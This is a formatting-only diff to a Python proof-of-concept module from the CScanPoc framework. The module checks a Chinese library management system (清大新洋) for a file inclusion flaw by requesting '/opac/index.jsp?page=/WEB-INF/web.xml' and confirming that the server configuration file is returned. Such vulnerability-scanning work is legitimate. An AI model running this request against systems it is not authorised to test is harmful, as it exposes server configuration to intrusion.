@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Infosea_0004' # 平台漏洞编号，留空
+    vuln_id = 'Infosea_0004'  # 平台漏洞编号，留空
     name = '北京清大新洋图书管理系统 任意文件包含'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.LFI # 漏洞类型
+    type = VulnType.LFI  # 漏洞类型
     disclosure_date = '2015-07-12'  # 漏洞公布时间
     desc = '''
         清大新洋图书系统 
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '清大新洋'  # 漏洞应用名称
     product_version = '北京清大新洋图书管理系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd899173e-7174-4f2f-be6d-d0bd56a4a175'
@@ -32,14 +34,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer  = http://www.wooyun.org/bugs/wooyun-2015-0125761
-            hh = hackhttp.hackhttp() 
-            arg = self.target       
-            url = arg + "/opac/index.jsp?page=/WEB-INF/web.xml"
-            code,head,res,errcode,finalurl = hh.http(url)
 
-            if code == 200 and ("xml" in res) and ("<servlet>"  in res) and ("<servlet-mapping>" in res):
+            # Refer  = http://www.wooyun.org/bugs/wooyun-2015-0125761
+            hh = hackhttp.hackhttp()
+            arg = self.target
+            url = arg + "/opac/index.jsp?page=/WEB-INF/web.xml"
+            code, head, res, errcode, finalurl = hh.http(url)
+
+            if code == 200 and ("xml" in res) and ("<servlet>" in res) and ("<servlet-mapping>" in res):
                 #security_hole("任意文件包含漏洞 " + arg)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
